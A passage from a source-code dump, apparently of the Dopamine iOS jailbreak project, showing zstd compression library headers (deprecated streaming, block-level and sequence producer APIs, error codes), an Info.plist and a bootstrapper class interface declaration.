ZSTD_DEPRECATED("use ZSTD_CCtx_reset and ZSTD_CCtx_refCDict, see zstd.h for detailed instructions")
ZSTDLIB_STATIC_API
size_t ZSTD_initCStream_usingCDict(ZSTD_CStream* zcs, const ZSTD_CDict* cdict);

/*! ZSTD_initCStream_usingCDict_advanced() :
 *   This function is DEPRECATED, and is equivalent to:
 *     ZSTD_CCtx_reset(zcs, ZSTD_reset_session_only);
 *     ZSTD_CCtx_setFParams(zcs, fParams);
 *     ZSTD_CCtx_setPledgedSrcSize(zcs, pledgedSrcSize);
 *     ZSTD_CCtx_refCDict(zcs, cdict);
 *
 * same as ZSTD_initCStream_usingCDict(), with control over frame parameters.
 * pledgedSrcSize must be correct. If srcSize is not known at init time, use
 * value ZSTD_CONTENTSIZE_UNKNOWN.
 * This prototype will generate compilation warnings.
 */
ZSTD_DEPRECATED("use ZSTD_CCtx_reset and ZSTD_CCtx_refCDict, see zstd.h for detailed instructions")
ZSTDLIB_STATIC_API
size_t ZSTD_initCStream_usingCDict_advanced(ZSTD_CStream* zcs,
                               const ZSTD_CDict* cdict,
                                     ZSTD_frameParameters fParams,
                                     unsigned long long pledgedSrcSize);

/*! ZSTD_resetCStream() :
 * This function is DEPRECATED, and is equivalent to:
 *     ZSTD_CCtx_reset(zcs, ZSTD_reset_session_only);
 *     ZSTD_CCtx_setPledgedSrcSize(zcs, pledgedSrcSize);
 * Note: ZSTD_resetCStream() interprets pledgedSrcSize == 0 as ZSTD_CONTENTSIZE_UNKNOWN, but
 *       ZSTD_CCtx_setPledgedSrcSize() does not do the same, so ZSTD_CONTENTSIZE_UNKNOWN must be
 *       explicitly specified.
 *
 *  start a new frame, using same parameters from previous frame.
 *  This is typically useful to skip dictionary loading stage, since it will re-use it in-place.
 *  Note that zcs must be init at least once before using ZSTD_resetCStream().
 *  If pledgedSrcSize is not known at reset time, use macro ZSTD_CONTENTSIZE_UNKNOWN.
 *  If pledgedSrcSize > 0, its value must be correct, as it will be written in header, and controlled at the end.
 *  For the time being, pledgedSrcSize==0 is interpreted as "srcSize unknown" for compatibility with older programs,
 *  but it will change to mean "empty" in future version, so use macro ZSTD_CONTENTSIZE_UNKNOWN instead.
 * @return : 0, or an error code (which can be tested using ZSTD_isError())
 *  This prototype will generate compilation warnings.
 */
ZSTD_DEPRECATED("use ZSTD_CCtx_reset, see zstd.h for detailed instructions")
ZSTDLIB_STATIC_API
size_t ZSTD_resetCStream(ZSTD_CStream* zcs, unsigned long long pledgedSrcSize);


typedef struct {
    unsigned long long ingested;   /* nb input bytes read and buffered */
    unsigned long long consumed;   /* nb input bytes actually compressed */
    unsigned long long produced;   /* nb of compressed bytes generated and buffered */
    unsigned long long flushed;    /* nb of compressed bytes flushed : not provided; can be tracked from caller side */
    unsigned currentJobID;         /* MT only : latest started job nb */
    unsigned nbActiveWorkers;      /* MT only : nb of workers actively compressing at probe time */
} ZSTD_frameProgression;

/* ZSTD_getFrameProgression() :
 * tells how much data has been ingested (read from input)
 * consumed (input actually compressed) and produced (output) for current frame.
 * Note : (ingested - consumed) is amount of input data buffered internally, not yet compressed.
 * Aggregates progression inside active worker threads.
 */
ZSTDLIB_STATIC_API ZSTD_frameProgression ZSTD_getFrameProgression(const ZSTD_CCtx* cctx);

/*! ZSTD_toFlushNow() :
 *  Tell how many bytes are ready to be flushed immediately.
 *  Useful for multithreading scenarios (nbWorkers >= 1).
 *  Probe the oldest active job, defined as oldest job not yet entirely flushed,
 *  and check its output buffer.
 * @return : amount of data stored in oldest job and ready to be flushed immediately.
 *  if @return == 0, it means either :
 *  + there is no active job (could be checked with ZSTD_frameProgression()), or
 *  + oldest job is still actively compressing data,
 *    but everything it has produced has also been flushed so far,
 *    therefore flush speed is limited by production speed of oldest job
 *    irrespective of the speed of concurrent (and newer) jobs.
 */
ZSTDLIB_STATIC_API size_t ZSTD_toFlushNow(ZSTD_CCtx* cctx);


/*=====   Advanced Streaming decompression functions  =====*/

/*!
 * This function is deprecated, and is equivalent to:
 *
 *     ZSTD_DCtx_reset(zds, ZSTD_reset_session_only);
 *     ZSTD_DCtx_loadDictionary(zds, dict, dictSize);
 *
 * note: no dictionary will be used if dict == NULL or dictSize < 8
 */
ZSTD_DEPRECATED("use ZSTD_DCtx_reset + ZSTD_DCtx_loadDictionary, see zstd.h for detailed instructions")
ZSTDLIB_STATIC_API size_t ZSTD_initDStream_usingDict(ZSTD_DStream* zds, const void* dict, size_t dictSize);

/*!
 * This function is deprecated, and is equivalent to:
 *
 *     ZSTD_DCtx_reset(zds, ZSTD_reset_session_only);
 *     ZSTD_DCtx_refDDict(zds, ddict);
 *
 * note : ddict is referenced, it must outlive decompression session
 */
ZSTD_DEPRECATED("use ZSTD_DCtx_reset + ZSTD_DCtx_refDDict, see zstd.h for detailed instructions")
ZSTDLIB_STATIC_API size_t ZSTD_initDStream_usingDDict(ZSTD_DStream* zds, const ZSTD_DDict* ddict);

/*!
 * This function is deprecated, and is equivalent to:
 *
 *     ZSTD_DCtx_reset(zds, ZSTD_reset_session_only);
 *
 * re-use decompression parameters from previous init; saves dictionary loading
 */
ZSTD_DEPRECATED("use ZSTD_DCtx_reset, see zstd.h for detailed instructions")
ZSTDLIB_STATIC_API size_t ZSTD_resetDStream(ZSTD_DStream* zds);


/* ********************* BLOCK-LEVEL SEQUENCE PRODUCER API *********************
 *
 * *** OVERVIEW ***
 * The Block-Level Sequence Producer API allows users to provide their own custom
 * sequence producer which libzstd invokes to process each block. The produced list
 * of sequences (literals and matches) is then post-processed by libzstd to produce
 * valid compressed blocks.
 *
 * This block-level offload API is a more granular complement of the existing
 * frame-level offload API compressSequences() (introduced in v1.5.1). It offers
 * an easier migration story for applications already integrated with libzstd: the
 * user application continues to invoke the same compression functions
 * ZSTD_compress2() or ZSTD_compressStream2() as usual, and transparently benefits
 * from the specific advantages of the external sequence producer. For example,
 * the sequence producer could be tuned to take advantage of known characteristics
 * of the input, to offer better speed / ratio, or could leverage hardware
 * acceleration not available within libzstd itself.
 *
 * See contrib/externalSequenceProducer for an example program employing the
 * Block-Level Sequence Producer API.
 *
 * *** USAGE ***
 * The user is responsible for implementing a function of type
 * ZSTD_sequenceProducer_F. For each block, zstd will pass the following
 * arguments to the user-provided function:
 *
 *   - sequenceProducerState: a pointer to a user-managed state for the sequence
 *     producer.
 *
 *   - outSeqs, outSeqsCapacity: an output buffer for the sequence producer.
 *     outSeqsCapacity is guaranteed >= ZSTD_sequenceBound(srcSize). The memory
 *     backing outSeqs is managed by the CCtx.
 *
 *   - src, srcSize: an input buffer for the sequence producer to parse.
 *     srcSize is guaranteed to be <= ZSTD_BLOCKSIZE_MAX.
 *
 *   - dict, dictSize: a history buffer, which may be empty, which the sequence
 *     producer may reference as it parses the src buffer. Currently, zstd will
 *     always pass dictSize == 0 into external sequence producers, but this will
 *     change in the future.
 *
 *   - compressionLevel: a signed integer representing the zstd compression level
 *     set by the user for the current operation. The sequence producer may choose
 *     to use this information to change its compression strategy and speed/ratio
 *     tradeoff. Note: the compression level does not reflect zstd parameters set
 *     through the advanced API.
 *
 *   - windowSize: a size_t representing the maximum allowed offset for external
 *     sequences. Note that sequence offsets are sometimes allowed to exceed the
 *     windowSize if a dictionary is present, see doc/zstd_compression_format.md
 *     for details.
 *
 * The user-provided function shall return a size_t representing the number of
 * sequences written to outSeqs. This return value will be treated as an error
 * code if it is greater than outSeqsCapacity. The return value must be non-zero
 * if srcSize is non-zero. The ZSTD_SEQUENCE_PRODUCER_ERROR macro is provided
 * for convenience, but any value greater than outSeqsCapacity will be treated as
 * an error code.
 *
 * If the user-provided function does not return an error code, the sequences
 * written to outSeqs must be a valid parse of the src buffer. Data corruption may
 * occur if the parse is not valid. A parse is defined to be valid if the
 * following conditions hold:
 *   - The sum of matchLengths and literalLengths must equal srcSize.
 *   - All sequences in the parse, except for the final sequence, must have
 *     matchLength >= ZSTD_MINMATCH_MIN. The final sequence must have
 *     matchLength >= ZSTD_MINMATCH_MIN or matchLength == 0.
 *   - All offsets must respect the windowSize parameter as specified in
 *     doc/zstd_compression_format.md.
 *   - If the final sequence has matchLength == 0, it must also have offset == 0.
 *
 * zstd will only validate these conditions (and fail compression if they do not
 * hold) if the ZSTD_c_validateSequences cParam is enabled. Note that sequence
 * validation has a performance cost.
 *
 * If the user-provided function returns an error, zstd will either fall back
 * to an internal sequence producer or fail the compression operation. The user can
 * choose between the two behaviors by setting the ZSTD_c_enableSeqProducerFallback
 * cParam. Fallback compression will follow any other cParam settings, such as
 * compression level, the same as in a normal compression operation.
 *
 * The user shall instruct zstd to use a particular ZSTD_sequenceProducer_F
 * function by calling
 *         ZSTD_registerSequenceProducer(cctx,
 *                                       sequenceProducerState,
 *                                       sequenceProducer)
 * This setting will persist until the next parameter reset of the CCtx.
 *
 * The sequenceProducerState must be initialized by the user before calling
 * ZSTD_registerSequenceProducer(). The user is responsible for destroying the
 * sequenceProducerState.
 *
 * *** LIMITATIONS ***
 * This API is compatible with all zstd compression APIs which respect advanced parameters.
 * However, there are three limitations:
 *
 * First, the ZSTD_c_enableLongDistanceMatching cParam is not currently supported.
 * COMPRESSION WILL FAIL if it is enabled and the user tries to compress with a block-level
 * external sequence producer.
 *   - Note that ZSTD_c_enableLongDistanceMatching is auto-enabled by default in some
 *     cases (see its documentation for details). Users must explicitly set
 *     ZSTD_c_enableLongDistanceMatching to ZSTD_ps_disable in such cases if an external
 *     sequence producer is registered.
 *   - As of this writing, ZSTD_c_enableLongDistanceMatching is disabled by default
 *     whenever ZSTD_c_windowLog < 128MB, but that's subject to change. Users should
 *     check the docs on ZSTD_c_enableLongDistanceMatching whenever the Block-Level Sequence
 *     Producer API is used in conjunction with advanced settings (like ZSTD_c_windowLog).
 *
 * Second, history buffers are not currently supported. Concretely, zstd will always pass
 * dictSize == 0 to the external sequence producer (for now). This has two implications:
 *   - Dictionaries are not currently supported. Compression will *not* fail if the user
 *     references a dictionary, but the dictionary won't have any effect.
 *   - Stream history is not currently supported. All advanced compression APIs, including
 *     streaming APIs, work with external sequence producers, but each block is treated as
 *     an independent chunk without history from previous blocks.
 *
 * Third, multi-threading within a single compression is not currently supported. In other words,
 * COMPRESSION WILL FAIL if ZSTD_c_nbWorkers > 0 and an external sequence producer is registered.
 * Multi-threading across compressions is fine: simply create one CCtx per thread.
 *
 * Long-term, we plan to overcome all three limitations. There is no technical blocker to
 * overcoming them. It is purely a question of engineering effort.
 */

#define ZSTD_SEQUENCE_PRODUCER_ERROR ((size_t)(-1))

typedef size_t ZSTD_sequenceProducer_F (
  void* sequenceProducerState,
  ZSTD_Sequence* outSeqs, size_t outSeqsCapacity,
  const void* src, size_t srcSize,
  const void* dict, size_t dictSize,
  int compressionLevel,
  size_t windowSize
);

/*! ZSTD_registerSequenceProducer() :
 * Instruct zstd to use a block-level external sequence producer function.
 *
 * The sequenceProducerState must be initialized by the caller, and the caller is
 * responsible for managing its lifetime. This parameter is sticky across
 * compressions. It will remain set until the user explicitly resets compression
 * parameters.
 *
 * Sequence producer registration is considered to be an "advanced parameter",
 * part of the "advanced API". This means it will only have an effect on compression
 * APIs which respect advanced parameters, such as compress2() and compressStream2().
 * Older compression APIs such as compressCCtx(), which predate the introduction of
 * "advanced parameters", will ignore any external sequence producer setting.
 *
 * The sequence producer can be "cleared" by registering a NULL function pointer. This
 * removes all limitations described above in the "LIMITATIONS" section of the API docs.
 *
 * The user is strongly encouraged to read the full API documentation (above) before
 * calling this function. */
ZSTDLIB_STATIC_API void
ZSTD_registerSequenceProducer(
  ZSTD_CCtx* cctx,
  void* sequenceProducerState,
  ZSTD_sequenceProducer_F* sequenceProducer
);


/*********************************************************************
*  Buffer-less and synchronous inner streaming functions (DEPRECATED)
*
*  This API is deprecated, and will be removed in a future version.
*  It allows streaming (de)compression with user allocated buffers.
*  However, it is hard to use, and not as well tested as the rest of
*  our API.
*
*  Please use the normal streaming API instead: ZSTD_compressStream2,
*  and ZSTD_decompressStream.
*  If there is functionality that you need, but it doesn't provide,
*  please open an issue on our GitHub.
********************************************************************* */

/**
  Buffer-less streaming compression (synchronous mode)

  A ZSTD_CCtx object is required to track streaming operations.
  Use ZSTD_createCCtx() / ZSTD_freeCCtx() to manage resource.
  ZSTD_CCtx object can be re-used multiple times within successive compression operations.

  Start by initializing a context.
  Use ZSTD_compressBegin(), or ZSTD_compressBegin_usingDict() for dictionary compression.

  Then, consume your input using ZSTD_compressContinue().
  There are some important considerations to keep in mind when using this advanced function :
  - ZSTD_compressContinue() has no internal buffer. It uses externally provided buffers only.
  - Interface is synchronous : input is consumed entirely and produces 1+ compressed blocks.
  - Caller must ensure there is enough space in `dst` to store compressed data under worst case scenario.
    Worst case evaluation is provided by ZSTD_compressBound().
    ZSTD_compressContinue() doesn't guarantee recover after a failed compression.
  - ZSTD_compressContinue() presumes prior input ***is still accessible and unmodified*** (up to maximum distance size, see WindowLog).
    It remembers all previous contiguous blocks, plus one separated memory segment (which can itself consists of multiple contiguous blocks)
  - ZSTD_compressContinue() detects that prior input has been overwritten when `src` buffer overlaps.
    In which case, it will "discard" the relevant memory section from its history.

  Finish a frame with ZSTD_compressEnd(), which will write the last block(s) and optional checksum.
  It's possible to use srcSize==0, in which case, it will write a final empty block to end the frame.
  Without last block mark, frames are considered unfinished (hence corrupted) by compliant decoders.

  `ZSTD_CCtx` object can be re-used (ZSTD_compressBegin()) to compress again.
*/

/*=====   Buffer-less streaming compression functions  =====*/
ZSTD_DEPRECATED("The buffer-less API is deprecated in favor of the normal streaming API. See docs.")
ZSTDLIB_STATIC_API size_t ZSTD_compressBegin(ZSTD_CCtx* cctx, int compressionLevel);
ZSTD_DEPRECATED("The buffer-less API is deprecated in favor of the normal streaming API. See docs.")
ZSTDLIB_STATIC_API size_t ZSTD_compressBegin_usingDict(ZSTD_CCtx* cctx, const void* dict, size_t dictSize, int compressionLevel);
ZSTD_DEPRECATED("The buffer-less API is deprecated in favor of the normal streaming API. See docs.")
ZSTDLIB_STATIC_API size_t ZSTD_compressBegin_usingCDict(ZSTD_CCtx* cctx, const ZSTD_CDict* cdict); /**< note: fails if cdict==NULL */

ZSTD_DEPRECATED("This function will likely be removed in a future release. It is misleading and has very limited utility.")
ZSTDLIB_STATIC_API
size_t ZSTD_copyCCtx(ZSTD_CCtx* cctx, const ZSTD_CCtx* preparedCCtx, unsigned long long pledgedSrcSize); /**<  note: if pledgedSrcSize is not known, use ZSTD_CONTENTSIZE_UNKNOWN */

ZSTD_DEPRECATED("The buffer-less API is deprecated in favor of the normal streaming API. See docs.")
ZSTDLIB_STATIC_API size_t ZSTD_compressContinue(ZSTD_CCtx* cctx, void* dst, size_t dstCapacity, const void* src, size_t srcSize);
ZSTD_DEPRECATED("The buffer-less API is deprecated in favor of the normal streaming API. See docs.")
ZSTDLIB_STATIC_API size_t ZSTD_compressEnd(ZSTD_CCtx* cctx, void* dst, size_t dstCapacity, const void* src, size_t srcSize);

/* The ZSTD_compressBegin_advanced() and ZSTD_compressBegin_usingCDict_advanced() are now DEPRECATED and will generate a compiler warning */
ZSTD_DEPRECATED("use advanced API to access custom parameters")
ZSTDLIB_STATIC_API
size_t ZSTD_compressBegin_advanced(ZSTD_CCtx* cctx, const void* dict, size_t dictSize, ZSTD_parameters params, unsigned long long pledgedSrcSize); /**< pledgedSrcSize : If srcSize is not known at init time, use ZSTD_CONTENTSIZE_UNKNOWN */
ZSTD_DEPRECATED("use advanced API to access custom parameters")
ZSTDLIB_STATIC_API
size_t ZSTD_compressBegin_usingCDict_advanced(ZSTD_CCtx* const cctx, const ZSTD_CDict* const cdict, ZSTD_frameParameters const fParams, unsigned long long const pledgedSrcSize);   /* compression parameters are already set within cdict. pledgedSrcSize must be correct. If srcSize is not known, use macro ZSTD_CONTENTSIZE_UNKNOWN */
/**
  Buffer-less streaming decompression (synchronous mode)

  A ZSTD_DCtx object is required to track streaming operations.
  Use ZSTD_createDCtx() / ZSTD_freeDCtx() to manage it.
  A ZSTD_DCtx object can be re-used multiple times.

  First typical operation is to retrieve frame parameters, using ZSTD_getFrameHeader().
  Frame header is extracted from the beginning of compressed frame, so providing only the frame's beginning is enough.
  Data fragment must be large enough to ensure successful decoding.
 `ZSTD_frameHeaderSize_max` bytes is guaranteed to always be large enough.
  result  : 0 : successful decoding, the `ZSTD_frameHeader` structure is correctly filled.
           >0 : `srcSize` is too small, please provide at least result bytes on next attempt.
           errorCode, which can be tested using ZSTD_isError().

  It fills a ZSTD_frameHeader structure with important information to correctly decode the frame,
  such as the dictionary ID, content size, or maximum back-reference distance (`windowSize`).
  Note that these values could be wrong, either because of data corruption, or because a 3rd party deliberately spoofs false information.
  As a consequence, check that values remain within valid application range.
  For example, do not allocate memory blindly, check that `windowSize` is within expectation.
  Each application can set its own limits, depending on local restrictions.
  For extended interoperability, it is recommended to support `windowSize` of at least 8 MB.

  ZSTD_decompressContinue() needs previous data blocks during decompression, up to `windowSize` bytes.
  ZSTD_decompressContinue() is very sensitive to contiguity,
  if 2 blocks don't follow each other, make sure that either the compressor breaks contiguity at the same place,
  or that previous contiguous segment is large enough to properly handle maximum back-reference distance.
  There are multiple ways to guarantee this condition.

  The most memory efficient way is to use a round buffer of sufficient size.
  Sufficient size is determined by invoking ZSTD_decodingBufferSize_min(),
  which can return an error code if required value is too large for current system (in 32-bits mode).
  In a round buffer methodology, ZSTD_decompressContinue() decompresses each block next to previous one,
  up to the moment there is not enough room left in the buffer to guarantee decoding another full block,
  which maximum size is provided in `ZSTD_frameHeader` structure, field `blockSizeMax`.
  At which point, decoding can resume from the beginning of the buffer.
  Note that already decoded data stored in the buffer should be flushed before being overwritten.

  There are alternatives possible, for example using two or more buffers of size `windowSize` each, though they consume more memory.

  Finally, if you control the compression process, you can also ignore all buffer size rules,
  as long as the encoder and decoder progress in "lock-step",
  aka use exactly the same buffer sizes, break contiguity at the same place, etc.

  Once buffers are setup, start decompression, with ZSTD_decompressBegin().
  If decompression requires a dictionary, use ZSTD_decompressBegin_usingDict() or ZSTD_decompressBegin_usingDDict().

  Then use ZSTD_nextSrcSizeToDecompress() and ZSTD_decompressContinue() alternatively.
  ZSTD_nextSrcSizeToDecompress() tells how many bytes to provide as 'srcSize' to ZSTD_decompressContinue().
  ZSTD_decompressContinue() requires this _exact_ amount of bytes, or it will fail.

  result of ZSTD_decompressContinue() is the number of bytes regenerated within 'dst' (necessarily <= dstCapacity).
  It can be zero : it just means ZSTD_decompressContinue() has decoded some metadata item.
  It can also be an error code, which can be tested with ZSTD_isError().

  A frame is fully decoded when ZSTD_nextSrcSizeToDecompress() returns zero.
  Context can then be reset to start a new decompression.

  Note : it's possible to know if next input to present is a header or a block, using ZSTD_nextInputType().
  This information is not required to properly decode a frame.

  == Special case : skippable frames ==

  Skippable frames allow integration of user-defined data into a flow of concatenated frames.
  Skippable frames will be ignored (skipped) by decompressor.
  The format of skippable frames is as follows :
  a) Skippable frame ID - 4 Bytes, Little endian format, any value from 0x184D2A50 to 0x184D2A5F
  b) Frame Size - 4 Bytes, Little endian format, unsigned 32-bits
  c) Frame Content - any content (User Data) of length equal to Frame Size
  For skippable frames ZSTD_getFrameHeader() returns zfhPtr->frameType==ZSTD_skippableFrame.
  For skippable frames ZSTD_decompressContinue() always returns 0 : it only skips the content.
*/

/*=====   Buffer-less streaming decompression functions  =====*/

ZSTDLIB_STATIC_API size_t ZSTD_decodingBufferSize_min(unsigned long long windowSize, unsigned long long frameContentSize);  /**< when frame content size is not known, pass in frameContentSize == ZSTD_CONTENTSIZE_UNKNOWN */

ZSTDLIB_STATIC_API size_t ZSTD_decompressBegin(ZSTD_DCtx* dctx);
ZSTDLIB_STATIC_API size_t ZSTD_decompressBegin_usingDict(ZSTD_DCtx* dctx, const void* dict, size_t dictSize);
ZSTDLIB_STATIC_API size_t ZSTD_decompressBegin_usingDDict(ZSTD_DCtx* dctx, const ZSTD_DDict* ddict);

ZSTDLIB_STATIC_API size_t ZSTD_nextSrcSizeToDecompress(ZSTD_DCtx* dctx);
ZSTDLIB_STATIC_API size_t ZSTD_decompressContinue(ZSTD_DCtx* dctx, void* dst, size_t dstCapacity, const void* src, size_t srcSize);

/* misc */
ZSTD_DEPRECATED("This function will likely be removed in the next minor release. It is misleading and has very limited utility.")
ZSTDLIB_STATIC_API void   ZSTD_copyDCtx(ZSTD_DCtx* dctx, const ZSTD_DCtx* preparedDCtx);
typedef enum { ZSTDnit_frameHeader, ZSTDnit_blockHeader, ZSTDnit_block, ZSTDnit_lastBlock, ZSTDnit_checksum, ZSTDnit_skippableFrame } ZSTD_nextInputType_e;
ZSTDLIB_STATIC_API ZSTD_nextInputType_e ZSTD_nextInputType(ZSTD_DCtx* dctx);




/* ========================================= */
/**       Block level API (DEPRECATED)       */
/* ========================================= */

/*!

    This API is deprecated in favor of the regular compression API.
    You can get the frame header down to 2 bytes by setting:
      - ZSTD_c_format = ZSTD_f_zstd1_magicless
      - ZSTD_c_contentSizeFlag = 0
      - ZSTD_c_checksumFlag = 0
      - ZSTD_c_dictIDFlag = 0

    This API is not as well tested as our normal API, so we recommend not using it.
    We will be removing it in a future version. If the normal API doesn't provide
    the functionality you need, please open a GitHub issue.

    Block functions produce and decode raw zstd blocks, without frame metadata.
    Frame metadata cost is typically ~12 bytes, which can be non-negligible for very small blocks (< 100 bytes).
    But users will have to take in charge needed metadata to regenerate data, such as compressed and content sizes.

    A few rules to respect :
    - Compressing and decompressing require a context structure
      + Use ZSTD_createCCtx() and ZSTD_createDCtx()
    - It is necessary to init context before starting
      + compression : any ZSTD_compressBegin*() variant, including with dictionary
      + decompression : any ZSTD_decompressBegin*() variant, including with dictionary
    - Block size is limited, it must be <= ZSTD_getBlockSize() <= ZSTD_BLOCKSIZE_MAX == 128 KB
      + If input is larger than a block size, it's necessary to split input data into multiple blocks
      + For inputs larger than a single block, consider using regular ZSTD_compress() instead.
        Frame metadata is not that costly, and quickly becomes negligible as source size grows larger than a block.
    - When a block is considered not compressible enough, ZSTD_compressBlock() result will be 0 (zero) !
      ===> In which case, nothing is produced into `dst` !
      + User __must__ test for such outcome and deal directly with uncompressed data
      + A block cannot be declared incompressible if ZSTD_compressBlock() return value was != 0.
        Doing so would mess up with statistics history, leading to potential data corruption.
      + ZSTD_decompressBlock() _doesn't accept uncompressed data as input_ !!
      + In case of multiple successive blocks, should some of them be uncompressed,
        decoder must be informed of their existence in order to follow proper history.
        Use ZSTD_insertBlock() for such a case.
*/

/*=====   Raw zstd block functions  =====*/
ZSTD_DEPRECATED("The block API is deprecated in favor of the normal compression API. See docs.")
ZSTDLIB_STATIC_API size_t ZSTD_getBlockSize   (const ZSTD_CCtx* cctx);
ZSTD_DEPRECATED("The block API is deprecated in favor of the normal compression API. See docs.")
ZSTDLIB_STATIC_API size_t ZSTD_compressBlock  (ZSTD_CCtx* cctx, void* dst, size_t dstCapacity, const void* src, size_t srcSize);
ZSTD_DEPRECATED("The block API is deprecated in favor of the normal compression API. See docs.")
ZSTDLIB_STATIC_API size_t ZSTD_decompressBlock(ZSTD_DCtx* dctx, void* dst, size_t dstCapacity, const void* src, size_t srcSize);
ZSTD_DEPRECATED("The block API is deprecated in favor of the normal compression API. See docs.")
ZSTDLIB_STATIC_API size_t ZSTD_insertBlock    (ZSTD_DCtx* dctx, const void* blockStart, size_t blockSize);  /**< insert uncompressed block into `dctx` history. Useful for multi-blocks decompression. */

#endif   /* ZSTD_H_ZSTD_STATIC_LINKING_ONLY */

#if defined (__cplusplus)
}
#endif

```

`Application/Dopamine/Headers/zstd_errors.h`:

```h
/*
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 * All rights reserved.
 *
 * This source code is licensed under both the BSD-style license (found in the
 * LICENSE file in the root directory of this source tree) and the GPLv2 (found
 * in the COPYING file in the root directory of this source tree).
 * You may select, at your option, one of the above-listed licenses.
 */

#ifndef ZSTD_ERRORS_H_398273423
#define ZSTD_ERRORS_H_398273423

#if defined (__cplusplus)
extern "C" {
#endif

/*===== dependency =====*/
#include <stddef.h>   /* size_t */


/* =====   ZSTDERRORLIB_API : control library symbols visibility   ===== */
#ifndef ZSTDERRORLIB_VISIBLE
   /* Backwards compatibility with old macro name */
#  ifdef ZSTDERRORLIB_VISIBILITY
#    define ZSTDERRORLIB_VISIBLE ZSTDERRORLIB_VISIBILITY
#  elif defined(__GNUC__) && (__GNUC__ >= 4) && !defined(__MINGW32__)
#    define ZSTDERRORLIB_VISIBLE __attribute__ ((visibility ("default")))
#  else
#    define ZSTDERRORLIB_VISIBLE
#  endif
#endif

#ifndef ZSTDERRORLIB_HIDDEN
#  if defined(__GNUC__) && (__GNUC__ >= 4) && !defined(__MINGW32__)
#    define ZSTDERRORLIB_HIDDEN __attribute__ ((visibility ("hidden")))
#  else
#    define ZSTDERRORLIB_HIDDEN
#  endif
#endif

#if defined(ZSTD_DLL_EXPORT) && (ZSTD_DLL_EXPORT==1)
#  define ZSTDERRORLIB_API __declspec(dllexport) ZSTDERRORLIB_VISIBLE
#elif defined(ZSTD_DLL_IMPORT) && (ZSTD_DLL_IMPORT==1)
#  define ZSTDERRORLIB_API __declspec(dllimport) ZSTDERRORLIB_VISIBLE /* It isn't required but allows to generate better code, saving a function pointer load from the IAT and an indirect jump.*/
#else
#  define ZSTDERRORLIB_API ZSTDERRORLIB_VISIBLE
#endif

/*-*********************************************
 *  Error codes list
 *-*********************************************
 *  Error codes _values_ are pinned down since v1.3.1 only.
 *  Therefore, don't rely on values if you may link to any version < v1.3.1.
 *
 *  Only values < 100 are considered stable.
 *
 *  note 1 : this API shall be used with static linking only.
 *           dynamic linking is not yet officially supported.
 *  note 2 : Prefer relying on the enum than on its value whenever possible
 *           This is the only supported way to use the error list < v1.3.1
 *  note 3 : ZSTD_isError() is always correct, whatever the library version.
 **********************************************/
typedef enum {
  ZSTD_error_no_error = 0,
  ZSTD_error_GENERIC  = 1,
  ZSTD_error_prefix_unknown                = 10,
  ZSTD_error_version_unsupported           = 12,
  ZSTD_error_frameParameter_unsupported    = 14,
  ZSTD_error_frameParameter_windowTooLarge = 16,
  ZSTD_error_corruption_detected = 20,
  ZSTD_error_checksum_wrong      = 22,
  ZSTD_error_literals_headerWrong = 24,
  ZSTD_error_dictionary_corrupted      = 30,
  ZSTD_error_dictionary_wrong          = 32,
  ZSTD_error_dictionaryCreation_failed = 34,
  ZSTD_error_parameter_unsupported   = 40,
  ZSTD_error_parameter_combination_unsupported = 41,
  ZSTD_error_parameter_outOfBound    = 42,
  ZSTD_error_tableLog_tooLarge       = 44,
  ZSTD_error_maxSymbolValue_tooLarge = 46,
  ZSTD_error_maxSymbolValue_tooSmall = 48,
  ZSTD_error_stabilityCondition_notRespected = 50,
  ZSTD_error_stage_wrong       = 60,
  ZSTD_error_init_missing      = 62,
  ZSTD_error_memory_allocation = 64,
  ZSTD_error_workSpace_tooSmall= 66,
  ZSTD_error_dstSize_tooSmall = 70,
  ZSTD_error_srcSize_wrong    = 72,
  ZSTD_error_dstBuffer_null   = 74,
  ZSTD_error_noForwardProgress_destFull = 80,
  ZSTD_error_noForwardProgress_inputEmpty = 82,
  /* following error codes are __NOT STABLE__, they can be removed or changed in future versions */
  ZSTD_error_frameIndex_tooLarge = 100,
  ZSTD_error_seekableIO          = 102,
  ZSTD_error_dstBuffer_wrong     = 104,
  ZSTD_error_srcBuffer_wrong     = 105,
  ZSTD_error_sequenceProducer_failed = 106,
  ZSTD_error_externalSequences_invalid = 107,
  ZSTD_error_maxCode = 120  /* never EVER use this value directly, it can change in future versions! Use ZSTD_isError() instead */
} ZSTD_ErrorCode;

/*! ZSTD_getErrorCode() :
    convert a `size_t` function result into a `ZSTD_ErrorCode` enum type,
    which can be used to compare with enum list published above */
ZSTDERRORLIB_API ZSTD_ErrorCode ZSTD_getErrorCode(size_t functionResult);
ZSTDERRORLIB_API const char* ZSTD_getErrorString(ZSTD_ErrorCode code);   /**< Same as ZSTD_getErrorName, but using a `ZSTD_ErrorCode` enum argument */


#if defined (__cplusplus)
}
#endif

#endif /* ZSTD_ERRORS_H_398273423 */

```

`Application/Dopamine/Info.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>UIApplicationSceneManifest</key>
	<dict>
		<key>UIApplicationSupportsMultipleScenes</key>
		<false/>
		<key>UISceneConfigurations</key>
		<dict>
			<key>UIWindowSceneSessionRoleApplication</key>
			<array>
				<dict>
					<key>UISceneConfigurationName</key>
					<string>Default Configuration</string>
					<key>UISceneDelegateClassName</key>
					<string>DOSceneDelegate</string>
				</dict>
			</array>
		</dict>
	</dict>
	<key>NSPhotoLibraryUsageDescription</key>
	<string>Dopamine needs to access your photo library to support picking a boot logo</string>
	<key>UIViewControllerBasedStatusBarAppearance</key>
	<true/>
</dict>
</plist>

```

`Application/Dopamine/Jailbreak/DOBootstrapper.h`:

```h
//
//  Bootstrapper.h
//  Dopamine
//
//  Created by Lars Fröder on 09.01.24.
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOBootstrapper : NSObject <NSURLSessionDelegate, NSURLSessionDownloadDelegate>
{
    NSURLSession *_urlSession;
    NSURLSessionDownloadTask *_bootstrapDownloadTask;
    void (^_downloadCompletionBlock)(NSURL * _Nullable location, NSError * _Nullable error);
}

- (void)prepareBootstrapWithCompletion:(void (^)(NSError *))completion;
- (NSError *)ensurePrivatePrebootIsWritable;
- (NSError *)installPackageManagers;
- (NSError *)finalizeBootstrap;
- (NSError *)deleteBootstrap;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/Jailbreak/DOBootstrapper.m`:

```m
//
